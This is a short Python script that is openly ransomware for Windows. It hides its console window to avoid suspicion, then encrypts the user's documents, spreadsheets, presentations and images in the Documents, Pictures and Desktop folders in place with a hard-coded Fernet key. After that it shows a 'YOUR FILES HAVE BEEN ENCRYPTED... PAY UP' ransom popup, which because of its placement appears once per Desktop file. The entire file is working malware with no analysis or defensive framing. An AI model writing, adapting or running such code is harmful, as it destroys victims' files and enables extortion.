#!/usr/bin/python3.8
import win32con
import win32gui
from cryptography.fernet import Fernet
import getpass
import glob
import tkinter
from tkinter import messagebox


def hide_console():
    # Hides the terminal console to prevent suspicion while working
    # in background
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide, win32con.SW_HIDE)


def encrypt_files():
    # This function encrypts the files with a key
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="

    # Get files to encrypt
    if True:
        usr = getpass.getuser()
        path = 'C:/Users/' + usr + '/Documents'
        for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
                      + glob.glob(path + '/**/*.pdf', recursive=True):
            # Start encryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)

            with open(f_name, "wb") as file:
                file.write(encrypted_data)

        # Get pictures to encrypt
        path = 'C:/Users/' + usr + '/Pictures'
        for f_name in glob.glob(path + '/**/*.jpg', recursive=True) \
                      + glob.glob(path + '/**/*.jpeg', recursive=True) \
                      + glob.glob(path + '/**/*.png', recursive=True) \
                      + glob.glob(path + '/**/*.svg', recursive=True):
            # Start encryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)

            with open(f_name, "wb") as file:
                file.write(encrypted_data)

        # Get documents in desktop to encrypt
        path = 'C:/Users/' + usr + '/Desktop'
        for f_name in glob.glob(path + '/**/*.pdf', recursive=True) \
                      + glob.glob(path + '/**/*.docx', recursive=True) \
                      + glob.glob(path + '/**/*.ppt', recursive=True) \
                      + glob.glob(path + '/**/*.xlsx', recursive=True) \
                      + glob.glob(path + '/**/*.pdf', recursive=True):
            # Start encryption
            k = key
            f = Fernet(k)

            with open(f_name, "rb") as file:
                file_data = file.read()
                encrypted_data = f.encrypt(file_data)

            with open(f_name, "wb") as file:
                file.write(encrypted_data)

                # this function prompts a window containing the ransom message
                window = tkinter.Tk()
                window.wm_withdraw()
                header = "HELLO... YOUR FILES HAVE BEEN ENCRYPTED"
                body = "PAY UP"
                messagebox.showinfo(title=header, message=body)


def main():
    hide_console()
    encrypt_files()


if __name__ == "__main__":
    main()
